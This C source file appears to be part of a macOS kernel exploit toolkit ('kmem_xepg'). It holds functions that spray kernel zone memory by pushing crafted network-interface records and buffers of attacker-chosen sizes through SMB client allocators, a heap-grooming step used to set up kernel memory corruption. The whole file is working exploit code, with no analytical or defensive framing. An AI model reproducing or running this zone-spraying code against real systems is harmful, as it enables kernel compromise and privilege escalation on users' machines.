//
//  zone_reserve_va.c
//  kmem_xepg
//
//  Created by admin on 12/26/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include "../smb/ssn_allocator.h"
#include "../smb/nic_allocator.h"

#include "zone_kext_reserve_va.h"
#include "allocator_rw.h"
#include "util_misc.h"
#include "platform_constants.h"


void kmem_zone_kext_reserve_va_small(const struct sockaddr_in* smb_addr, uint num_pages, uint z_elem_size) {
    assert(z_elem_size <= 256);
    uint8_t alloc_size = XE_MIN(z_elem_size, 255);
    
    smb_nic_allocator allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    uint num_allocs = num_pages * XE_PAGE_SIZE / z_elem_size;
    if (alloc_size > 16 && alloc_size <= 32) {
        num_allocs /= 2;
    }
    
    uint32_t infos_size = sizeof(struct network_nic_info) * num_allocs;
    struct network_nic_info* infos = malloc(infos_size);
    bzero(infos, infos_size);
    
    for (int i=0; i<num_allocs; i++) {
        struct network_nic_info* info = &infos[i];
        info->nic_index = 1;
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_len = alloc_size;
        info->addr_4.sin_addr.s_addr = i;
        info->addr_4.sin_port = 1111;
        info->next_offset = sizeof(*info);
    }
    
    int error = smb_nic_allocator_allocate(allocator, infos, num_allocs, infos_size);
    assert(error == 0);
    free(infos);
    error = smb_nic_allocator_destroy(&allocator);
    assert(error == 0);
}


void kmem_zone_kext_reserve_va_large(const struct sockaddr_in* smb_addr, uint num_pages, uint z_elem_size) {
    uint num_allocs = XE_PAGE_SIZE * num_pages / (z_elem_size * 2);
    char* data = malloc(z_elem_size);
    
    kmem_allocator_rw_t allocator = kmem_allocator_rw_create(smb_addr, num_allocs);
    int error = kmem_allocator_rw_allocate(allocator, num_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = data;
        *data1_size = z_elem_size;
        *data2 = data;
        *data2_size = z_elem_size;
    }, NULL);
    assert(error == 0);
    free(data);
    
    error = kmem_allocator_rw_destroy(&allocator);
    assert(error == 0);
}


void kmem_zone_kext_reserve_va(const struct sockaddr_in* smb_addr, uint num_pages, uint z_elem_size) {
    if (z_elem_size <= 256) {
        kmem_zone_kext_reserve_va_small(smb_addr, num_pages, z_elem_size);
    } else {
        kmem_zone_kext_reserve_va_large(smb_addr, num_pages, z_elem_size);
    }
}
